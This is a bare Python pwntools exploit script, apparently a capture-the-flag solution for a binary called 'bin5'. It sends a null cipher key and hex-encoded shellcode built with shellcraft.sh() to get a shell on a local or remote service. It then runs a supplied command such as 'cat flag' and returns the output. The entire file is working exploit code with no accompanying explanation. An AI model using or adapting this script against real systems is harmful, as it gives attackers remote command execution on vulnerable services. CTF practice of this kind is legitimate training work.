from pwn import *

def exp(local,binary,msg,ip=0,port=0,timeout=1):
	if local:
		p = process(binary)
	else:
		p = remote(ip,port,timeout=timeout)
	
	try:	
		key = '\x00'*9

		shellcode = 'ichunqiu'+asm(shellcraft.sh())
		p.recvuntil('Plz give the cipher key(8 byte)',timeout=timeout)
		p.send(key)
		p.recvuntil('Plz give me the hex Cipher text',timeout=timeout)
		# gdb.attach(p,'b *0x08048582')
		p.sendline(shellcode.encode('hex'))
		p.sendline('echo 123')
		p.recvuntil('123',timeout=timeout)
		p.sendline(msg)
		p.sendline('echo 456')
		flag = p.recvuntil('456',timeout=timeout).replace('\n','')
		p.close()
		return flag[:-3]
	except:
		p.close()
		return ''


if __name__ == '__main__':
	print exp(True,'bin5','cat flag')
